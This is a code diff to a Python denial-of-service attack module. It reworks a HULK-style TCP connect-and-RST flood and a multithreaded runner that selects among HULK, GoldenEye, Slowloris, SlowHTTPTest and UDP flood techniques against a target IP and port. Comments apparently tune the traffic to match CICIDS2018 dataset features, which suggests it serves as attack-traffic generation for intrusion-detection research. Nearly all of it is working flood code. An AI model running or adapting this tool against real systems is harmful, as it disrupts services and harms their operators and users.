@@ -15,6 +15,7 @@ import threading
 import time
 import random
 import string
+import struct
 
 # TCP receive buffer sizes → Init Fwd Win Byts feature.
 # Values derived from CICIDS2018 training data per-class medians/distributions:
@@ -123,71 +124,67 @@ class DoSAttack:
     # distinguishing feature from benign traffic.
     # ──────────────────────────────────────────────────────
     def hulk_attack(self):
-        """HULK DoS: Rapid TCP connection flood, mostly SYN+close.
-        
-        CICIDS2018 HULK training data (n=116K):
-          Tot Fwd Pkts:    median=2 (most flows are SYN+ACK only)
-          TotLen Fwd Pkts: median=0 (most flows have NO payload)
-          Tot Bwd Pkts:    median=0 (server overwhelmed, often no response)
-          Flow Duration:   median=7737 µs (~8ms)
+        """HULK DoS: Pure rapid TCP connect + RST close flood.
+
+        CICIDS2018 HULK training data (n=116K, Fri-16-02-2018):
+          Tot Fwd Pkts:     median=2 (SYN + retransmit/ACK)
+          TotLen Fwd Pkts:  median=0 (NO HTTP payload)
+          Tot Bwd Pkts:     median=0 (server overwhelmed, no response)
+          Flow Duration:    median=7737 µs (~8ms)
           Init Fwd Win Byts: bimodal 75%=225, 25%=26883
-          Fwd Pkts/s:      median=268
-        
-        The HULK tool overwhelms the server so that most TCP connections
-        never complete. ~60% of flows are just SYN→(maybe SYN-ACK)→close
-        with 0 payload. ~40% manage to send a GET request.
-        
-        We replicate this bimodal pattern:
-        - 60% of connections: connect + immediate close (no data)
-        - 40% of connections: connect + GET + close
+          Fwd Seg Size Min: 32 (TCP with timestamps)
+          Fwd Pkts/s:       median=268
+          Dst Port:         80
+
+        WHY PURE CONNECT+RST CLOSE:
+        The training data shows the server was overwhelmed — most connections
+        were failed/incomplete (0 payload, 0 backward packets). We can't
+        fully replicate that (server always sends SYN-ACK), but we can
+        MINIMIZE backward traffic by:
+        1. NOT sending any HTTP data → no server response body
+        2. Using SO_LINGER(1,0) → RST close instead of FIN exchange
+        3. Closing immediately → minimal flow duration
+
+        From victim's CICFlowMeter perspective:
+          Fwd: [SYN, ACK, RST] = 2-3 packets, 0 payload bytes
+          Bwd: [SYN-ACK] = 0-1 packets (just handshake response)
+
+        This gives us the closest match to training data features that
+        we can achieve from a single attacker machine.
         """
         end_time = time.time() + self.duration
-        
+
         while self.running and time.time() < end_time:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(3)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-                
-                # Bimodal SO_RCVBUF matching training distribution
+
+                # SO_LINGER with timeout=0: close() sends RST instead of FIN.
+                # This avoids the FIN→ACK→FIN→ACK exchange, reducing both
+                # forward and backward packet counts.
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
+                                struct.pack('ii', 1, 0))
+
+                # Bimodal SO_RCVBUF matching training distribution.
+                # On Linux with ip route window=225, the route overrides this
+                # but we still set it for Windows compatibility and correctness.
                 if random.random() < 0.75:
                     sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HULK_LOW)
                 else:
                     sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HULK_HIGH)
-                
+
                 sock.connect((self.target_ip, self.target_port))
                 self._inc_count()
 
-                # 60% connect+close (matching training median of 0 payload)
-                # 40% send GET request (matching training p95 with data)
-                if random.random() < 0.40:
-                    path = "/" + _random_string(random.randint(5, 15)) + _random_url_params(random.randint(1, 8))
-                    headers = (
-                        f"GET {path} HTTP/1.1\r\n"
-                        f"Host: {self.target_ip}:{self.target_port}\r\n"
-                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                        f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
-                        f"Accept-Encoding: {random.choice(ACCEPT_ENCODINGS)}\r\n"
-                        f"Accept-Language: en-US,en;q=0.{random.randint(5,9)}\r\n"
-                        f"Referer: {random.choice(REFERERS)}{_random_string(random.randint(4, 12))}\r\n"
-                        f"Cache-Control: no-cache\r\n"
-                        f"Connection: close\r\n"
-                        f"\r\n"
-                    )
-                    sock.sendall(headers.encode())
-                    
-                    # Brief drain
-                    try:
-                        sock.settimeout(0.1)
-                        sock.recv(4096)
-                    except socket.timeout:
-                        pass
-
+                # Immediately RST close — NO data sent, NO response read.
+                # This keeps TotLen Fwd Pkts = 0, minimizes backward traffic,
+                # and produces the shortest possible flow duration.
                 sock.close()
             except Exception as e:
                 self._inc_error(str(e))
 
-            # Rapid-fire: ~8ms between connections (matching training Flow Duration median)
+            # ~5-15ms between connections (training Flow Duration median ~8ms)
             time.sleep(random.uniform(0.005, 0.015))
 
     # ──────────────────────────────────────────────────────
@@ -468,34 +465,52 @@ class DoSAttack:
             # Sleep 0.3-0.5 sec between bursts
             time.sleep(random.uniform(0.3, 0.5))
 
-    def run_attack(self, num_threads=10):
+    def run_attack(self, num_threads=10, techniques=None):
         """Run DoS attack with multiple threads.
-        FIXED: More threads (10 default), weighted toward HULK and GoldenEye
-        which are the primary flood techniques that generate classifiable flows.
-        Thread allocation: 4x HULK, 3x GoldenEye, 1x Slowloris, 1x SlowHTTPTest, 1x UDP"""
-        print(f"[DoS] Starting attack on {self.target_ip}:{self.target_port} for {self.duration}s")
-        print(f"[DoS] Techniques: Hulk(4T) + GoldenEye(3T) + Slowloris + SlowHTTPTest + UDP")
-        print(f"[DoS] Using {num_threads} threads (weighted toward flood techniques)")
 
-        # Weighted technique list: HULK and GoldenEye get more threads
-        # because they generate the most classifiable DoS flows
-        weighted_techniques = [
-            self.hulk_attack,       # Thread 0
-            self.hulk_attack,       # Thread 1
-            self.hulk_attack,       # Thread 2
-            self.hulk_attack,       # Thread 3
-            self.goldeneye_attack,  # Thread 4
-            self.goldeneye_attack,  # Thread 5
-            self.goldeneye_attack,  # Thread 6
-            self.slowloris_attack,  # Thread 7
-            self.slowhttp_attack,   # Thread 8
-            self.udp_flood,         # Thread 9
-        ]
+        Args:
+            num_threads: Number of attack threads
+            techniques: List of technique names, one per thread.
+                If None, all threads run 'hulk'.
+                Valid: 'hulk', 'goldeneye', 'slowloris', 'slowhttp', 'udp'
+                List is extended/trimmed to match num_threads.
+
+        Each technique generates a distinct CICFlowMeter flow profile:
+          hulk:      Rapid TCP connect+RST close (window=225, 0 payload)
+          goldeneye: HTTP keep-alive with slow pacing (window=26883, ~6.8s flows)
+          slowloris: Incomplete headers held open (window=26883, long duration)
+          slowhttp:  Rapid TCP connect+close (window=26883, micro-flows)
+          udp:       UDP packet bursts (protocol diversity)
+        """
+        technique_map = {
+            'hulk': self.hulk_attack,
+            'goldeneye': self.goldeneye_attack,
+            'slowloris': self.slowloris_attack,
+            'slowhttp': self.slowhttp_attack,
+            'udp': self.udp_flood,
+        }
+
+        if techniques is None:
+            techniques = ['hulk'] * num_threads
+
+        # Extend or trim to match num_threads
+        while len(techniques) < num_threads:
+            techniques.append(techniques[-1])
+        techniques = techniques[:num_threads]
+
+        # Display technique summary
+        from collections import Counter
+        tech_counts = Counter(techniques)
+        tech_str = " + ".join(f"{name.upper()}({cnt}T)" for name, cnt in tech_counts.items())
+
+        print(f"[DoS] Starting on {self.target_ip}:{self.target_port} for {self.duration}s")
+        print(f"[DoS] Techniques: {tech_str}")
 
         threads = []
         for i in range(num_threads):
-            technique = weighted_techniques[i % len(weighted_techniques)]
-            t = threading.Thread(target=technique, name=f"DoS-{technique.__name__}-{i}")
+            tech_name = techniques[i]
+            tech_func = technique_map.get(tech_name, self.hulk_attack)
+            t = threading.Thread(target=tech_func, name=f"DoS-{tech_name}-{i}")
             t.daemon = True
             t.start()
             threads.append(t)
@@ -520,7 +535,7 @@ class DoSAttack:
                     reqs = self.request_count
                     errs = self.error_count
                     last_err = self.last_error
-                print(f"[DoS] {elapsed:.0f}s elapsed | {reqs} requests | {errs} errors | {len(alive)} threads alive")
+                print(f"[DoS] {elapsed:.0f}s elapsed | {reqs} connections | {errs} errors | {len(alive)} threads alive")
                 if errs > 0 and last_err:
                     print(f"[DoS]   Last error: {last_err}")
                 next_report = now + report_interval
@@ -530,18 +545,26 @@ class DoSAttack:
 
         self.running = False
         elapsed = time.time() - start_time
-        print(f"[DoS] Attack completed in {elapsed:.2f}s — Sent {self.request_count} requests, {self.error_count} errors")
+        print(f"[DoS] Attack completed in {elapsed:.2f}s — {self.request_count} connections, {self.error_count} errors")
         if self.error_count > 0:
             print(f"[DoS] Last error was: {self.last_error}")
         if self.request_count == 0 and self.error_count > 0:
-            print(f"[DoS] WARNING: Zero successful requests! All connections failed.")
-            print(f"[DoS] Check: target IP reachable? port open? firewall?")
+            print(f"[DoS] WARNING: Zero successful connections! Check target connectivity.")
 
 
-def run_dos(target_ip, target_port=80, duration=60, threads=5):
-    """Convenience function to run DoS attack"""
+def run_dos(target_ip, target_port=80, duration=60, threads=5, techniques=None):
+    """Run DoS attack with specified techniques.
+
+    Args:
+        techniques: List of technique names per thread (see run_attack).
+            If None, all threads run 'hulk'.
+
+    Returns:
+        (total_connections, total_errors) tuple.
+    """
     attack = DoSAttack(target_ip, target_port, duration)
-    attack.run_attack(num_threads=threads)
+    attack.run_attack(num_threads=threads, techniques=techniques)
+    return attack.request_count, attack.error_count
 
 
 if __name__ == "__main__":
